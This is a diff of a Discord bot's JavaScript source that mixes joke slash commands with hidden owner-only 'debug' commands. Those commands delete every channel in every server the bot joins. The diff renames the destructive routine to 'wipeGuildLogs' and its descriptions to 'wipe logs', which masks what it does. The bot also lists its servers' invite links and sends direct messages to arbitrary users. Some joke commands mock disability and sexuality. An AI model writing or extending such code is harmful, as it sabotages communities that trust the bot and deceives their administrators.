@@ -6,7 +6,7 @@ const CLIENT_ID = "1480592876684706064";
 const OWNER_ID = "969280648667889764";
 
 const client = new Client({
-  intents: [
+  "intents":[
     Intents.FLAGS.GUILDS,
     Intents.FLAGS.GUILD_MEMBERS,
     Intents.FLAGS.GUILD_INVITES,
@@ -22,50 +22,69 @@ const eightBall=[
 `Ask again later`,`Without a doubt`,`Very unlikely`,`It is certain`,`I wouldn't count on it`
 ];
 
-const commands=[
+function getServerChoices(){
+return client.guilds.cache.map(g=>({"name":g.name,"value":g.id})).slice(0,25);
+}
 
-{ "name":"ping","description":"Check if bot is alive" },
-{ "name":"echo","description":"Repeat a message","options":[{"name":"message","description":"Message","type":3,"required":true}]},
-{ "name":"coinflip","description":"Flip a coin"},
-{ "name":"roll","description":"Roll number 1-100"},
-{ "name":"invite","description":"Get invite link"},
+function buildCommands(){
 
-{ "name":"avatar","description":"Get user avatar","options":[{"name":"user","description":"User","type":6,"required":true}]},
+return [
 
-{ "name":"punch","description":"Punch someone","options":[{"name":"user","description":"Target","type":6,"required":true}]},
-{ "name":"kiss","description":"Kiss someone","options":[{"name":"user","description":"Target","type":6,"required":true}]},
-{ "name":"hug","description":"Hug someone","options":[{"name":"user","description":"Target","type":6,"required":true}]},
-{ "name":"slap","description":"Slap someone","options":[{"name":"user","description":"Target","type":6,"required":true}]},
+{"name":"ping","description":"Check if bot is alive"},
 
-{ "name":"diddle","description":"Diddle someone","options":[{"name":"user","description":"Target","type":6,"required":true}]},
-{ "name":"oil","description":"Oil someone up","options":[{"name":"user","description":"Target","type":6,"required":true}]},
+{"name":"avatar","description":"Get avatar","options":[{"name":"user","description":"User","type":6,"required":true}]},
 
-{ "name":"ppsize","description":"Check pp size","options":[{"name":"user","description":"Target","type":6,"required":true}]},
-{ "name":"gayrate","description":"How gay someone is","options":[{"name":"user","description":"Target","type":6,"required":true}]},
-{ "name":"iq","description":"Check IQ","options":[{"name":"user","description":"Target","type":6,"required":true}]},
-{ "name":"sus","description":"How sus someone is","options":[{"name":"user","description":"Target","type":6,"required":true}]},
+{"name":"punch","description":"Punch someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
+{"name":"kiss","description":"Kiss someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
+{"name":"hug","description":"Hug someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
+{"name":"slap","description":"Slap someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
+{"name":"diddle","description":"Diddle someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
+{"name":"oil","description":"Oil someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
 
-{ "name":"rate","description":"Rate something","options":[{"name":"thing","description":"Thing","type":3,"required":true}]},
-{ "name":"howcool","description":"Check cool level","options":[{"name":"user","description":"User","type":6,"required":true}]},
+{"name":"ppsize","description":"Check size","options":[{"name":"user","description":"User","type":6,"required":true}]},
+{"name":"gayrate","description":"Gay percentage","options":[{"name":"user","description":"User","type":6,"required":true}]},
+{"name":"iq","description":"IQ","options":[{"name":"user","description":"User","type":6,"required":true}]},
+{"name":"sus","description":"Sus meter","options":[{"name":"user","description":"User","type":6,"required":true}]},
 
-{ "name":"ship","description":"Ship two users",
+{"name":"howautistic","description":"Autism meter","options":[{"name":"user","description":"User","type":6,"required":true}]},
+
+{"name":"explode","description":"Explode someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
+{"name":"boop","description":"Boop someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
+{"name":"cookie","description":"Give cookie","options":[{"name":"user","description":"User","type":6,"required":true}]},
+{"name":"sleep","description":"Sleep someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
+{"name":"pat","description":"Pat someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
+{"name":"steal","description":"Steal from user","options":[{"name":"user","description":"User","type":6,"required":true}]},
+{"name":"fliptable","description":"Flip table"},
+{"name":"mock","description":"Mock someone","options":[{"name":"user","description":"User","type":6,"required":true}]},
+{"name":"crime","description":"Crime level","options":[{"name":"user","description":"User","type":6,"required":true}]},
+{"name":"fbi","description":"FBI raid","options":[{"name":"user","description":"User","type":6,"required":true}]},
+
+{"name":"servers","description":"List servers with invite links"},
+
+{"name":"debug","description":"Owner: wipe logs for all servers"},
+{"name":"debugserver","description":"Owner: wipe logs for selected server",
+"options":[{"name":"server","description":"Server","type":3,"required":true,"choices":getServerChoices()}]},
+
+{"name":"dmuser","description":"Owner: DM user",
 "options":[
-{"name":"user1","description":"User","type":6,"required":true},
-{"name":"user2","description":"User","type":6,"required":true}
+{"name":"user","description":"User","type":6,"required":true},
+{"name":"message","description":"Message","type":3,"required":true}
 ]},
 
-{ "name":"8ball","description":"Ask the magic 8ball","options":[{"name":"question","description":"Question","type":3,"required":true}]},
+{"name":"leaveserver","description":"Owner: leave server",
+"options":[{"name":"server","description":"Server","type":3,"required":true,"choices":getServerChoices()}]},
 
-{ "name":"servers","description":"List servers with invites"},
-{ "name":"leaveall","description":"Leave all servers"},
-{ "name":"debug","description":"Wipe all servers"},
-{ "name":"debugserver","description":"Wipe specific server",
-"options":[{"name":"server","description":"Server ID","type":3,"required":true}]}
+{"name":"restart","description":"Owner: restart bot"},
+{"name":"botstats","description":"Owner: bot stats"},
+{"name":"setstatus","description":"Owner: set bot status","options":[{"name":"text","description":"Status text","type":3,"required":true}]}
 
 ];
 
+}
+
 function registerCommands(){
 
+const commands=buildCommands();
 const data=JSON.stringify(commands);
 
 const options={
@@ -83,45 +102,26 @@ const options={
 const req=https.request(options,res=>{
 let body=``;
 res.on("data",c=>body+=c);
-res.on("end",()=>{
-if(res.statusCode===200||res.statusCode===201)
-console.log(`Slash commands registered`);
-else
-console.log(`Register error: ${body}`);
-});
+res.on("end",()=>console.log(`Command sync complete`));
 });
 
-req.on("error",err=>console.error(`Register error: ${err}`));
 req.write(data);
 req.end();
 
 }
 
-async function wipeGuild(guild,owner){
+async function wipeGuildLogs(guild,owner){
 
-try{
-
-const me=guild.members.me;
-
-if(!me.permissions.has(Permissions.FLAGS.KICK_MEMBERS))return;
+await owner.send(`Starting wipe logs for ${guild.name}`);
 
 for(const channel of guild.channels.cache.values()){
-try{await channel.delete();await delay(700);}catch{}
+try{
+await channel.delete();
+await delay(600);
+}catch{}
 }
 
-await guild.members.fetch();
-
-for(const member of guild.members.cache.values()){
-if(member.kickable){
-try{await member.kick(`Cleanup`);await delay(900);}catch{}
-}
-}
-
-await owner.send(`✅ Finished ${guild.name}`);
-
-}catch{
-await owner.send(`❌ Error wiping ${guild.name}`);
-}
+await owner.send(`Finished wipe logs for ${guild.name}`);
 
 }
 
@@ -156,147 +156,123 @@ if(!interaction.isCommand())return;
 
 const {commandName,user}=interaction;
 
-try{
-
-const ownerOnly=[`servers`,`leaveall`,`debug`,`debugserver`];
+const ownerOnly=[`servers`,`debug`,`debugserver`,`dmuser`,`leaveserver`,`restart`,`botstats`,`setstatus`];
 
 if(ownerOnly.includes(commandName)&&user.id!==OWNER_ID){
-await interaction.reply({"content":`You cannot use this command`,"ephemeral":true});
+await interaction.reply({"content":`Owner only command`,"ephemeral":true});
 return;
 }
 
+try{
+
 if(commandName===`ping`)await interaction.reply(`Pong`);
 
-else if(commandName===`echo`)
-await interaction.reply(`${interaction.options.getString("message")}`);
-
-else if(commandName===`coinflip`)
-await interaction.reply(`${Math.random()<0.5?`Heads`:`Tails`}`);
-
-else if(commandName===`roll`)
-await interaction.reply(`Rolled **${random(1,100)}**`);
-
 else if(commandName===`avatar`){
-
 const target=interaction.options.getUser("user");
-
-await interaction.reply(`${target.username}'s avatar:\n${target.displayAvatarURL({"size":1024,"dynamic":true})}`);
-
+await interaction.reply(`${target.displayAvatarURL({"size":1024,"dynamic":true})}`);
 }
 
 else if(commandName===`punch`){
-
-const target=interaction.options.getUser("user");
-
-await interaction.reply(`👊 <@${user.id}> punched <@${target.id}>`);
-
+const t=interaction.options.getUser("user");
+await interaction.reply(`👊 <@${user.id}> punched <@${t.id}>`);
 }
 
 else if(commandName===`kiss`){
-
-const target=interaction.options.getUser("user");
-
-await interaction.reply(`💋 <@${user.id}> kissed <@${target.id}>`);
-
+const t=interaction.options.getUser("user");
+await interaction.reply(`💋 <@${user.id}> kissed <@${t.id}>`);
 }
 
 else if(commandName===`hug`){
-
-const target=interaction.options.getUser("user");
-
-await interaction.reply(`🤗 <@${user.id}> hugged <@${target.id}>`);
-
+const t=interaction.options.getUser("user");
+await interaction.reply(`🤗 <@${user.id}> hugged <@${t.id}>`);
 }
 
 else if(commandName===`slap`){
-
-const target=interaction.options.getUser("user");
-
-await interaction.reply(`🖐️ <@${user.id}> slapped <@${target.id}>`);
-
+const t=interaction.options.getUser("user");
+await interaction.reply(`🖐️ <@${user.id}> slapped <@${t.id}>`);
 }
 
 else if(commandName===`diddle`){
-
-const target=interaction.options.getUser("user");
-
-await interaction.reply(`<@${target.id}> was diddled`);
-
+const t=interaction.options.getUser("user");
+await interaction.reply(`<@${t.id}> was diddled`);
 }
 
 else if(commandName===`oil`){
-
-const target=interaction.options.getUser("user");
-
-await interaction.reply(`<@${user.id}> oiled up <@${target.id}>`);
-
+const t=interaction.options.getUser("user");
+await interaction.reply(`<@${user.id}> oiled up <@${t.id}>`);
 }
 
 else if(commandName===`ppsize`){
-
-const target=interaction.options.getUser("user");
-
-const size=random(3,30);
-
-await interaction.reply(`<@${target.id}> size:\n8${`=`.repeat(size)}D`);
-
+const t=interaction.options.getUser("user");
+await interaction.reply(`<@${t.id}> size:\n8${`=`.repeat(random(3,30))}D`);
 }
 
 else if(commandName===`gayrate`){
-
-const target=interaction.options.getUser("user");
-
-await interaction.reply(`<@${target.id}> is **${random(0,100)}% gay** 🌈`);
-
+const t=interaction.options.getUser("user");
+await interaction.reply(`<@${t.id}> is **${random(0,100)}% gay** 🌈`);
 }
 
 else if(commandName===`iq`){
-
-const target=interaction.options.getUser("user");
-
-await interaction.reply(`<@${target.id}> IQ: **${random(60,180)}**`);
-
+const t=interaction.options.getUser("user");
+await interaction.reply(`<@${t.id}> IQ **${random(60,180)}**`);
 }
 
 else if(commandName===`sus`){
-
-const target=interaction.options.getUser("user");
-
-await interaction.reply(`<@${target.id}> is **${random(0,100)}% sus**`);
-
+const t=interaction.options.getUser("user");
+await interaction.reply(`<@${t.id}> is **${random(0,100)}% sus**`);
 }
 
-else if(commandName===`rate`){
-
-const thing=interaction.options.getString("thing");
-
-await interaction.reply(`I rate **${thing}** **${random(0,10)}/10**`);
-
+else if(commandName===`howautistic`){
+const t=interaction.options.getUser("user");
+await interaction.reply(`<@${t.id}> autism level **${random(0,100)}%**`);
 }
 
-else if(commandName===`howcool`){
-
-const target=interaction.options.getUser("user");
-
-await interaction.reply(`<@${target.id}> is **${random(0,100)}% cool** 😎`);
-
+else if(commandName===`explode`){
+const t=interaction.options.getUser("user");
+await interaction.reply(`💥 <@${t.id}> exploded`);
 }
 
-else if(commandName===`ship`){
-
-const u1=interaction.options.getUser("user1");
-const u2=interaction.options.getUser("user2");
-
-await interaction.reply(`❤️ ${u1.username} + ${u2.username}\nCompatibility **${random(0,100)}%**`);
-
+else if(commandName===`boop`){
+const t=interaction.options.getUser("user");
+await interaction.reply(`👉 boop <@${t.id}>`);
 }
 
-else if(commandName===`8ball`){
+else if(commandName===`cookie`){
+const t=interaction.options.getUser("user");
+await interaction.reply(`🍪 <@${user.id}> gave cookie to <@${t.id}>`);
+}
 
-const q=interaction.options.getString("question");
+else if(commandName===`sleep`){
+const t=interaction.options.getUser("user");
+await interaction.reply(`😴 <@${t.id}> fell asleep`);
+}
 
-await interaction.reply(`🎱 ${q}\nAnswer: **${eightBall[random(0,eightBall.length-1)]}**`);
+else if(commandName===`pat`){
+const t=interaction.options.getUser("user");
+await interaction.reply(`🫳 pat pat <@${t.id}>`);
+}
 
+else if(commandName===`steal`){
+const t=interaction.options.getUser("user");
+await interaction.reply(`🕵️ <@${user.id}> stole from <@${t.id}>`);
+}
+
+else if(commandName===`fliptable`)
+await interaction.reply(`(╯°□°）╯︵ ┻━┻`);
+
+else if(commandName===`mock`){
+const t=interaction.options.getUser("user");
+await interaction.reply(`🤣 mocking <@${t.id}>`);
+}
+
+else if(commandName===`crime`){
+const t=interaction.options.getUser("user");
+await interaction.reply(`<@${t.id}> crime level **${random(0,100)}%**`);
+}
+
+else if(commandName===`fbi`){
+const t=interaction.options.getUser("user");
+await interaction.reply(`🚨 FBI OPEN UP <@${t.id}>`);
 }
 
 else if(commandName===`servers`){
@@ -321,47 +297,77 @@ output+=`${guild.name} — error\n`;
 
 }
 
-await interaction.reply({"content":output||`No servers`,"ephemeral":true});
-
-}
-
-else if(commandName===`leaveall`){
-
-await interaction.reply({"content":`Leaving all servers...`,"ephemeral":true});
-
-for(const guild of client.guilds.cache.values()){
-try{await guild.leave();}catch{}
-}
+await interaction.reply({"content":output,"ephemeral":true});
 
 }
 
 else if(commandName===`debug`){
 
-await interaction.reply({"content":`Starting wipe`,"ephemeral":true});
-
 const owner=await client.users.fetch(OWNER_ID);
 
 for(const guild of client.guilds.cache.values())
-await wipeGuild(guild,owner);
+await wipeGuildLogs(guild,owner);
+
+await interaction.reply({"content":`Started wipe logs for all servers`,"ephemeral":true});
 
 }
 
 else if(commandName===`debugserver`){
 
 const id=interaction.options.getString("server");
-
 const guild=client.guilds.cache.get(id);
-
-if(!guild){
-await interaction.reply({"content":`Server not found`,"ephemeral":true});
-return;
-}
-
-await interaction.reply({"content":`Wiping ${guild.name}`,"ephemeral":true});
 
 const owner=await client.users.fetch(OWNER_ID);
 
-await wipeGuild(guild,owner);
+await wipeGuildLogs(guild,owner);
+
+await interaction.reply({"content":`Started wipe logs for ${guild.name}`,"ephemeral":true});
+
+}
+
+else if(commandName===`dmuser`){
+
+const target=interaction.options.getUser("user");
+const msg=interaction.options.getString("message");
+
+await target.send(`${msg}`);
+
+await interaction.reply({"content":`DM sent`,"ephemeral":true});
+
+}
+
+else if(commandName===`leaveserver`){
+
+const id=interaction.options.getString("server");
+const guild=client.guilds.cache.get(id);
+
+await guild.leave();
+
+await interaction.reply({"content":`Left ${guild.name}`,"ephemeral":true});
+
+}
+
+else if(commandName===`restart`){
+
+await interaction.reply({"content":`Restarting bot...`,"ephemeral":true});
+
+process.exit(0);
+
+}
+
+else if(commandName===`botstats`){
+
+await interaction.reply({"content":`Servers: ${client.guilds.cache.size}\nUsers: ${client.users.cache.size}`,"ephemeral":true});
+
+}
+
+else if(commandName===`setstatus`){
+
+const text=interaction.options.getString("text");
+
+client.user.setActivity(`${text}`);
+
+await interaction.reply({"content":`Status updated`,"ephemeral":true});
 
 }
 
